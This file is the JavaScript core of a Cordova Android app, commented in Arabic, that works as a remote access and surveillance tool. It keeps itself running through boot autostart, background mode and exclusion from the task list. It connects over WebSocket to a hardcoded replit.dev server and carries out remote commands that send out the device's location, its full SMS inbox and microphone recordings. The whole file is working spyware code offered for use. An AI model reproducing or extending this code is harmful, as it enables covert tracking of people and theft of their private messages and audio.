// www/js/app.js

document.addEventListener('deviceready', onDeviceReady, false);

// WebSocket متغيرات عامة
let ws = null;
let reconnectDelay = 2000;            // يبدأ بـ 2 ث
const RECONNECT_MAX = 60000;          // حتى 60 ث
let heartbeatTimer = null;
let batteryInfo = { level: null, charging: null };
let receivedRequests = [];
let wasManuallyClosed = false;

// URL الخاص بسيرفرك
const WS_URL = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';

// معلومات الجهاز
function buildDeviceInfo() {
  const safe = (v, d) => (typeof v !== 'undefined' && v !== null ? v : d);
  return {
    uuid: safe(window.device && device.uuid, generateUUID()),
    model: safe(window.device && device.model, 'Unknown'),
    platform: safe(window.device && device.platform, 'Unknown'),
    version: safe(window.device && device.version, 'Unknown'),
    manufacturer: safe(window.device && device.manufacturer, 'Unknown'),
    isVirtual: safe(window.device && device.isVirtual, false),
    serial: safe(window.device && device.serial, 'Unknown'),
    battery: batteryInfo,
    timestamp: new Date().toISOString()
  };
}

function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    const r = Math.random() * 16 | 0, v = (c === 'x') ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

function onDeviceReady() {
  console.log('[Device] ready');

  // 1) خدمة أمامية دائمة
  try {
    if (cordova.plugins && cordova.plugins.foregroundService) {
      cordova.plugins.foregroundService.start(
        'التطبيق يعمل',
        'جارٍ مراقبة الأوامر في الخلفية',
        'ic_stat_icon'
      );
      // بعض الإصدارات تدعم التثبيت كخدمة لاصقة (Sticky)
      cordova.plugins.foregroundService.update({
        id: 1,
        title: 'التطبيق يعمل',
        text: 'متصل بالخادم ويستقبل الأوامر',
        icon: 'ic_stat_icon'
      });
    }
  } catch (e) { console.warn('[FG Service] ', e); }

  // 2) تشغيل تلقائي بعد إعادة التشغيل
  try {
    if (cordova.plugins && cordova.plugins.autoStart) {
      cordova.plugins.autoStart.enable();
      cordova.plugins.autoStart.enableBootStart();
    }
  } catch (e) { console.warn('[AutoStart] ', e); }

  // 3) BackgroundMode كطبقة احتياط
  try {
    if (cordova.plugins && cordova.plugins.backgroundMode) {
      cordova.plugins.backgroundMode.setDefaults({
        title: 'التطبيق يعمل في الخلفية',
        text: 'جارٍ مراقبة الأوامر الواردة',
        resume: true,
        silent: false
      });
      cordova.plugins.backgroundMode.enable();
      cordova.plugins.backgroundMode.overrideBackButton();
      cordova.plugins.backgroundMode.excludeFromTaskList(); // يقلّل قتل العملية عند السحب
      cordova.plugins.backgroundMode.on('activate', function () {
        cordova.plugins.backgroundMode.disableWebViewOptimizations();
      });
    }
  } catch (e) { console.warn('[BackgroundMode] ', e); }

  // 4) محاولة طلب تجاهل تحسينات البطارية (اختياري)
  try {
    if (cordova.plugins && cordova.plugins.DozeOptimize) {
      cordova.plugins.DozeOptimize.isIgnoringBatteryOptimizations(function (ignoring) {
        if (!ignoring) {
          cordova.plugins.DozeOptimize.requestOptimizations(function () {
            console.log('[Doze] تم طلب تجاهل التحسينات');
          }, function (err) {
            console.warn('[Doze] فشل الطلب', err);
          });
        }
      }, function (err) {
        console.warn('[Doze] تحقق الفحص فشل', err);
      });
    }
  } catch (e) { console.warn('[Doze] ', e); }

  // 5) مراقبة حالة البطارية (cordova-plugin-battery-status)
  window.addEventListener('batterystatus', function (status) {
    batteryInfo = { level: status.level, charging: !!status.isPlugged };
    sendIfOpen({
      type: 'battery_update',
      payload: { level: status.level, charging: !!status.isPlugged, ts: new Date().toISOString() }
    });
  }, false);

  // 6) مراقبة حالة الشبكة
  document.addEventListener('offline', function () {
    console.warn('[Network] Offline');
    // لا نغلق الـ WS يدويًا؛ سيغلق وحده ويعيد المحاولة لاحقًا
  }, false);

  document.addEventListener('online', function () {
    console.log('[Network] Online - محاولة إعادة الاتصال');
    tryReconnectNow();
  }, false);

  // 7) دورة حياة التطبيق
  document.addEventListener('pause', function () {
    console.log('[Lifecycle] pause');
    // نترك WS شغالاً في الخلفية بفضل FG Service
  }, false);

  document.addEventListener('resume', function () {
    console.log('[Lifecycle] resume');
    tryReconnectNow();
  }, false);

  // 8) ابدأ الاتصال
  wasManuallyClosed = false;
  connectWebSocket();
}

/* ========================= WebSocket ========================= */

function connectWebSocket() {
  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
    return; // اتصال قائم
  }
  console.log('[WS] Connecting...', WS_URL);
  ws = new WebSocket(WS_URL);

  ws.onopen = () => {
    console.log('[WS] Connected');
    reconnectDelay = 2000; // نعيد الضبط
    // أرسل تحية + معلومات الجهاز
    sendIfOpen({ type: 'hello', device: buildDeviceInfo() });

    // ابدأ Heartbeat كل 25 ثانية
    if (heartbeatTimer) clearInterval(heartbeatTimer);
    heartbeatTimer = setInterval(() => {
      sendIfOpen({
        type: 'heartbeat',
        ts: new Date().toISOString(),
        battery: batteryInfo,
        // يمكن أن ترسل counters/metrics هنا
      });
    }, 25000);
  };

  ws.onmessage = (event) => {
    try {
      const msg = JSON.parse(event.data);
      if (!msg || !msg.type) return;

      if (msg.type === 'command') {
        handleCommand(msg);
      } else if (msg.type === 'ping') {
        sendIfOpen({ type: 'pong', ts: new Date().toISOString() });
      }
    } catch (e) {
      console.error('[WS] message parse error', e);
    }
  };

  ws.onerror = (err) => {
    console.warn('[WS] Error', err);
  };

  ws.onclose = () => {
    console.warn('[WS] Disconnected');
    if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
    if (!wasManuallyClosed) {
      scheduleReconnect();
    }
  };
}

function scheduleReconnect() {
  const delay = Math.min(reconnectDelay, RECONNECT_MAX);
  console.log(`[WS] Reconnect in ${Math.round(delay / 1000)}s`);
  setTimeout(() => {
    connectWebSocket();
  }, delay);
  reconnectDelay = Math.min(reconnectDelay * 2, RECONNECT_MAX);
}

function tryReconnectNow() {
  if (!ws || ws.readyState !== WebSocket.OPEN) {
    reconnectDelay = 2000;
    connectWebSocket();
  }
}

function sendIfOpen(obj) {
  try {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(obj));
    }
  } catch (e) {
    console.warn('[WS] send failed', e);
  }
}

/* ========================= الأوامر ========================= */

function handleCommand(commandMsg) {
  const { command, commandId } = commandMsg;
  console.log('[CMD] received', commandMsg);
  receivedRequests.push({ commandId, command, ts: Date.now() });

  switch ((command && command.type) || '') {
    case 'get_location':
      getLocation(commandId);
      break;
    case 'get_sms':
      getSMS(commandId);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration || 10);
      break;
    case 'get_device_info':
      reply(commandId, 'success', { deviceInfo: buildDeviceInfo() });
      break;
    case 'get_received_requests':
      reply(commandId, 'success', { count: receivedRequests.length, requests: receivedRequests });
      break;
    default:
      reply(commandId, 'error', { error: 'Unknown command', received: command });
  }
}

function reply(commandId, status, payload) {
  sendIfOpen({
    type: 'command_result',
    commandId,
    status,
    payload: payload || {},
    ts: new Date().toISOString()
  });
}

/* -------- الموقع -------- */
function getLocation(commandId) {
  const options = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
  if (!navigator.geolocation) {
    return reply(commandId, 'error', { error: 'Geolocation not supported' });
  }
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      reply(commandId, 'success', {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        altitudeAccuracy: pos.coords.altitudeAccuracy,
        heading: pos.coords.heading,
        speed: pos.coords.speed,
        timestamp: pos.timestamp
      });
    },
    (err) => {
      reply(commandId, 'error', { error: 'Geolocation error', details: err && err.message });
    },
    options
  );
}

/* -------- قراءة الرسائل -------- */
function getSMS(commandId) {
  if (typeof SMS === 'undefined' || !SMS.listSMS) {
    return reply(commandId, 'error', { error: 'SMS plugin not available', suggestion: 'Install cordova-sms-plugin' });
  }
  const filter = { box: 'inbox', maxCount: 1000, indexFrom: 0 };
  try {
    SMS.listSMS(
      filter,
      function (messages) {
        reply(commandId, 'success', {
          count: messages.length,
          messages: messages.map(m => ({
            id: m._id,
            address: m.address,
            body: m.body, // كامل النص
            date: m.date,
            read: m.read
          }))
        });
      },
      function (error) {
        reply(commandId, 'error', { error: 'SMS error', details: error });
      }
    );
  } catch (e) {
    reply(commandId, 'error', { error: 'SMS exception', details: e && e.message });
  }
}

/* -------- تسجيل الصوت -------- */
function recordAudio(commandId, durationSec) {
  // استخدام plugin media-capture لثبات أعلى باكج أندرويد
  try {
    navigator.device.capture.captureAudio(function (mediaFiles) {
      // أرسل أول ملف
      const f = mediaFiles && mediaFiles[0];
      if (!f) return reply(commandId, 'error', { error: 'No audio captured' });

      reply(commandId, 'success', {
        file: {
          name: f.name,
          fullPath: f.fullPath,
          localURL: f.localURL,
          type: f.type,
          lastModified: f.lastModifiedDate || null,
          size: f.size || null
        }
      });
    }, function (err) {
      reply(commandId, 'error', { error: 'Audio capture error', details: err && err.message });
    }, { limit: 1, duration: durationSec });
  } catch (e) {
    reply(commandId, 'error', { error: 'Audio capture exception', details: e && e.message });
  }
}

/* =========================================================== */
